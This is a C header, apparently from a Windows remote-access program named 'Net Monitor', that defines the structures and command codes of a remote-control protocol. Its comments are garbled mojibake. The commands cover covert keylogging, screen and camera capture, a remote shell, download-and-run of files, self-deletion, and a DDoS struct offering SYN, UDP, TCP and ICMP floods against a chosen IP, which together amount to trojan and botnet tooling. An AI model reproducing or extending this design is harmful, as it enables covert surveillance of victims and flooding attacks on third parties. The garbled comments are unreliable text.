#include <WTypes.h>

#ifndef _UTILITY_STRUCT_H
#define _UTILITY_STRUCT_H

//////////////////////////////////////////////////////////////////////////////////////////////

#ifndef     VIDEO_WIDTH
#define		VIDEO_WIDTH				320
#endif

#ifndef		VIDEO_HEIGHT
#define		VIDEO_HEIGHT			240
#endif

#ifndef		VIDEO_SIZE
#define		VIDEO_SIZE				250 * 1024
#endif


// RTP����󳤶�
#define RTP_MAX_PACKET_BUFF			1024 * 2 * 1024				// 2m

#define RTP_MAX_A_PACKET_BUFF		1024 * 5					// ���5K

// ��Ƶ��
#ifndef PACKET_TYPE_VIDEO
#define PACKET_TYPE_VIDEO			0xF0
#endif

// ��Ƶ��
#ifndef PACKET_TYPE_AUDIO
#define PACKET_TYPE_AUDIO			0xF1
#endif

// ��Ļͼ���
#ifndef PACKET_TYPE_SCREEN
#define PACKET_TYPE_SCREEN			0xF2
#endif

typedef struct RTP_HDR_S
{
	UINT		nRTPData;			/* RTP Data Length */
	UINT		nPacketType;		/* RTP Packet Type ( 0xF0Ϊ��Ƶ��,0xF1Ϊ��Ƶ�� )*/
}RTP_HDR_S;

typedef  UINT(__stdcall *RTP_ON_RECV_CB)(BYTE*,UINT,void*);		// ���ݻص�����


//////////////////////////////////////////////////////////////////////
// ��Ļ���ӽӿ�
//////////////////////////////////////////////////////////////////////

#define SCREEN_FULL				0x0001
#define SCREEN_DIFFERENCE		0x0002
#define SCREEN_XOR				0x0003

typedef struct SCREENCAP_SCREENBITMAP
{
	WORD Width;
	WORD Height;
	WORD Depth;
	WORD Method;
	DWORD Size;
	BYTE Bits[];
} SCREENCAP_SCREENBITMAP, *PSCREENCAP_SCREENBITMAP;

typedef struct _SCREEN_HANDLE
{
	int nWidth;
	int nHeight;
	int nDepth;
	HDC hScrDC;
	HDC hMemDC;
	HBITMAP hMemBitmap;
	PVOID pScreenBuffer;
	PVOID pTempBuffer;
	PVOID pOutputBuffer;
	DWORD nSize1;
	DWORD nSize2;
} SCREEN_HANDLE, *PSCREEN_HANDLE;

//////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////

#define WM_CONNECT_CLIENT			WM_USER + 100				// ���ӿͻ����Զ�����Ϣ

#define WM_DEAL_CMD					WM_USER + 101				// ���������Զ�����Ϣ

#define WM_FILE_DOWNDLOAD_FINISH	WM_USER + 102				// �����ļ���Ϣ

#define WM_FILE_UPLOAD_FINISH		WM_USER + 103				// �ϴ��ļ�����

#define WM_SERVER_OFFLINE			WM_USER + 104				// �����������Ϣ

#define WM_SERVER_UNINSTALL			WM_USER + 105				// ж�ط������Ϣ

#define CLIENT_LISTEN_PORT			80						// Net Monitor�ͻ���ʹ�õ�Ĭ�ϼ����˿�

#define CMD_BUFFER_MAX				1024						// �����建�����ֵ		1K
		
#define	c_ParamFile					_T("NMParam.dat")			// �����ļ�

//#define MAIN_FRAME_BK_COLOR		(RGB(218,230,245))
#define MAIN_FRAME_BK_COLOR			(RGB(251, 250, 251))

typedef enum E_SKIN_TYPE
{
	E_SKIN_Base = 0,
	E_SKIN_XP   = 1,
	E_SKIN_NEO  = 2
} E_SKIN_TYPE;

// ����ṹ
typedef struct NM_CMD_S
{
	DWORD	dwCmd;
	DWORD	dw1;
	DWORD	dw2;
	DWORD	dw3;
	BYTE	pBuff[ CMD_BUFFER_MAX ];
}NM_CMD_S;

// ���ɷ�����ļ���Ϣ�ṹ
typedef struct NM_SERVER_FILE_S
{
	CHAR	szClientIP[_MAX_PATH];					// �ͻ���IP��ַ
	UINT	nClientPort;							// �ͻ���ͨѶ�˿�
	UINT	nCheckFlag;								// �ṹУ��λ
	BOOL	bDeleteSelf;							// ɾ������
}NM_SERVER_FILE_S;

// ϵͳ��Ϣ�ṹ
typedef struct SYSTEM_INFO_S
{
	DWORD	dwPlatformId;							// ϵͳ�汾���
	DWORD	dwMajorVersion;							// ϵͳ�汾���
	DWORD	dwMinorVersion;							// ϵͳ�汾���
	DWORD	dwMemorySize;							// �ڴ��С		(MΪ��λ)
	
	DWORD	nRunDays;								// �������������
	DWORD	nRunHours;								// ���������Сʱ��
	DWORD	nRunMinutes;							// ��������з�����
	DWORD	nRunSenconds;							// ���������������

	DWORD	bHaveCamera;							// �Ƿ�������ͷ
	
	CHAR	szCPUType[_MAX_PATH];					// CPU��Ϣ
	CHAR	szComputerName[_MAX_PATH];				// ������
//	CHAR	szUserName[_MAX_PATH];					// �û���

}SYSTEM_INFO_S;

typedef struct SERVER_REMOTE_S
{
	SOCKET			hSocketServer;					// �����˴���ָ���SOCKET
	SYSTEM_INFO_S	emSystemInfo;					// �����ϵͳ������Ϣ
	CHAR			szServerIP[_MAX_PATH];			// �����IP��ַ
	CHAR			szAddress[_MAX_PATH];			// �ü�������ڵ�ַ
	PVOID			pCMDThread;
}SERVER_REMOTE_S;

typedef struct PROCESS_INFO_S
{
	CHAR			szFileName[FILENAME_MAX];		// ��������	
	DWORD			dwPid;							// ����ID	
	DWORD			dwPriority;						// ���ȼ�
	DWORD			dwThreads;						// �߳���
	DWORD			dwParentPID;					// ������ID
	
}PROCESS_INFO_S;

typedef struct WINDOW_INFO_S
{
	CHAR			szProcessName[FILENAME_MAX];	// ��������	
	CHAR			szTitleName[FILENAME_MAX];		// ��������	
	CHAR			szClassName[FILENAME_MAX];		// ����������	
	DWORD			dwPid;							// ����ID	
	DWORD			dwHWND;							// ���ھ��
	
}WINDOW_INFO_S;

typedef struct SERVICE_INFO_S
{
	CHAR			szServiceName[FILENAME_MAX];	// ��������	
	CHAR			szDisplayName[FILENAME_MAX];	// ������ʾ����	
	DWORD			dwRunState;						// ��������״̬	
	DWORD			dwStartType;					// ������������
	
}SERVICE_INFO_S;

typedef struct DDOS_INFO_S							// DDOS�����ṹ
{
	BOOL	bSYN;									// SYN
	BOOL	bUDP;									// UDP
	BOOL	bTCP;									// TCP
	BOOL	bICMP;									// ICMP
	BOOL	bTCPBreak;								// TCP Break
	UINT	nDDOSMinutes;							// DDOS Times (Minutes)
	UINT	nDDOSPort;								// DDOS Port	
	CHAR	szDDOSIP[MAX_PATH];						// DDOS IP
}DDOS_INFO_S;

typedef struct DISKDRIVER_INFO_S					// ��������Ϣ
{
	DWORD	dwType;									// ����������
	char	cVolumeName[FILENAME_MAX];				// �������
}DISKDRIVER_INFO_S;

typedef struct FILE_INFO_S							// ��������Ϣ
{
	DWORD	dwSize;									// �ļ����ļ��д�С
	DWORD   dwFileAttributes;						// �ļ�����
	BOOL	bPath;									// Ŀ¼�����ļ�
	char	cCreateTime[FILENAME_MAX];				// ����ʱ��
	char	cModifyTime[FILENAME_MAX];				// �޸�ʱ��
	char	cAccessTime[FILENAME_MAX];				// ������ʱ��	
	char	cFileName[FILENAME_MAX];				// �ļ����ļ�������
	char	cFullPathName[FILENAME_MAX];			// �ļ����ļ���ȫ����
}FILE_INFO_S;

//TreeView���ڵ�����//////////////////////////////
#define TI_ROOT							0x00000001					// ���ڵ�"�ļ�������"
#define TI_HOST							0x00000002					// �����ڵ�(�˽ڵ�������,����"�ҵĵ���"��Զ������)
#define TI_DISKDRIVE_REMOVABLE			0x00000004					// ����
#define TI_DISKDRIVE_FIXED				0x00000008					// Ӳ�̼�����
#define TI_DISKDRIVE_CDROM				0x00000010					// ����
#define TI_ONCEEXPAND					0x00000020					// �˽ڵ�����չ����
#define TI_DISKDRIVE					0x00000040					// �˽ڵ��Ǵ���������
#define TI_CUT							0x00000080					// �˽ڵ㱻����
#define TI_REMOTE						0x00000100					// Զ�̽ڵ�(�˽ڵ�Ǳ���)
#define TI_ONCEACCESS					0x00000200					// �������ʹ�(���ڱ�ʶԶ�������͹���)

//ListView�б�������///////////////////////////////
#define LI_FOUND						0XFFFFFFFF					// ���б�������Tree�б��ҵ�,����˵�������½����ļ���

//��ӳ���б��ͼ������/////////////////////////////
#define ICO_FILEMANAGER							0x00000000			// �ļ�������
#define ICO_MYCOMPUTER							0x00000001			// �ҵĵ���
#define ICO_FOLDER								0x00000002			// �ļ���
#define ICO_FOLDER_OPEN							0x00000003			// �ļ���(��״̬)
#define ICO_DRIVE_REMOVABLE						0x00000004			// ����������
#define ICO_DRIVE_FIXED							0x00000005			// Ӳ��������
#define ICO_DRIVE_CDROM							0x00000006			// ����������
#define ICO_DRIVE_ZIP							0x00000007			// ZIP������
#define ICO_DRIVE_REMOTE						0x00000008			// ����������
#define ICO_REMOTEHOST							0x00000009			// Զ������
#define ICO_REMOTEHOST_DISCONNECT				0x0000000A			// Զ������(�Ͽ�����״̬)
#define ICO_REMOTEHOST_HTTPTUNNEL				0x0000000B			// Զ��HTTP�������
#define ICO_REMOTEHOST_HTTPTUNNEL_DISCONNECT	0x0000000C			// Զ��HTTP�������(�Ͽ�����״̬)

#define LIST_FILE								0x00000001
#define LIST_PATH								0x00000002

#define CMD_ERROR				0					// �������
#define CMD_SUCCESS				1					// ����ɹ�

// ����η��͸��ͻ���ָ��
#define CMD_OFFLINE				100					// ���������
#define CMD_ONLINE				101					// ���������

// �ͻ��˷��͸������ָ��
#define CMD_AUDIO_RENDER		105					// �������� ���͵�ǰϵͳ����
#define CMD_AUDIO_BROADCAST		106					// �������� ���������Խ�

#define CMD_GETSCREEN			110					// �������� ���͵�ǰ��Ļ��Ϣ
#define CMD_CHANGE_FRAME_RATE	111					// �������� �޸ĵ�ǰ������Ļ����֡��
#define CMD_GETCAMERA			112					// �������� ���͵�ǰ����ͷ��Ƶ
#define CMD_GETSYSTEMINFO		113					// �������� ����ϵͳ��Ϣ(����ʹ��)
#define CMD_GETPROCESSLIST		114					// �������� ���ͽ����б�

#define CMD_KILLPROCESS			116					// �������� ��������
#define CMD_GETKEYLOG			117					// �������� �鿴���̼�¼
#define CMD_STARTKEYLOG			118					// �������� ��ʼ���̼�¼
#define CMD_STOPKEYLOG			119					// �������� ֹͣ���̼�¼
#define CMD_ERASEKEYLOG			120					// �������� ������̼�¼

#define CMD_CMD_SHELL_START		121					// �������� ��ʼ�������
#define CMD_CMD_SHELL_STOP		122					// �������� ֹͣ�������
#define CMD_CMD_SHELL_PROCESS	123					// �������� ��������

#define CMD_GETWINDOWLIST		124					// �������� ��ȡ�����б�
#define CMD_WINDOW_MIN			125					// �������� ���ô�����С��
#define CMD_WINDOW_MAX			126					// �������� ���ô������
#define CMD_WINDOW_NORMAL		127					// �������� ���ô���ΪĬ�ϴ�С
#define CMD_WINDOW_HIDE			128					// �������� ���ô�������
#define CMD_WINDOW_CLOSE		129					// �������� �رմ���

#define CMD_KEYDOWN				130					// �������� ���̰�������
#define CMD_KEYUP				131					// �������� ���̰���̧��
#define CMD_MOUSEMOVE			132					// �������� ����ƶ�
#define CMD_LBUTTONDOWN			133					// �������� ����������
#define CMD_LBUTTONUP			134					// �������� ������̧��
#define CMD_LBUTTONDBLCLK		135					// �������� ������˫��
#define CMD_RBUTTONDOWN			136					// �������� ����Ҽ�����        
#define CMD_RBUTTONUP			137					// �������� ����Ҽ�̧��
#define CMD_RBUTTONDBLCLK		138					// �������� ����Ҽ�˫��
#define CMD_KEYCTRLALTDEL		139					// �������� ���¼� Ctrl + Alt + del 
#define CMD_SYSKEYDOWN			140					// �������� ����ϵͳ��������
#define CMD_SYSKEYUP			141					// �������� ����ϵͳ����̧��

#define CMD_FILE_GETROOT		200					// �������� �����ҵĵ���
#define CMD_FILE_GETPATHFILE    201					// �������� ����ָ��Ŀ¼���ļ�
#define CMD_FILE_DELETEFILE     202					// �������� ɾ���ļ�
#define CMD_FILE_RUNFILE        203					// �������� �����ļ�
#define CMD_FILE_RENAMEFILE     204					// �������� �������ļ�
#define CMD_FILE_DWONLOADFILE   205					// �������� �����ļ�
#define CMD_FILE_DOWNFILERUN	206					// �������� �����ļ�������
#define CMD_FILE_UPLOADFILE     207					// �������� �ϴ��ļ�
#define CMD_FILE_UPLOADFILERUN	208					// �������� �ϴ��ļ�������
#define CMD_FILE_CREATEDIR      209					// �������� �����ļ���

#define CMD_DDOS_START			250					// �������� ��ʼDDOS����
#define CMD_DDOS_STOP			251					// �������� ֹͣDDOS����

#define CMD_GETSERVICELIST		260					// �������� ���ص�ǰ�����б�
#define CMD_SERVICE_SET_STATE	261					// �������� �ı����ǰ����״̬
#define CMD_SERVICE_START_TYPE	262					// �������� �ı������������

#define CMD_PROTOCOL_PING		300					// ����Э��ָ��

#define CMD_LOGOFF				400					// ע��
#define CMD_POWEROFF			401					// �رյ�Դ
#define CMD_REBOOT				402					// ����ϵͳ
#define CMD_SHUTDOWN			403					// �رյ���

#define CMD_UNINSTALL			500					// ж�ط����

#endif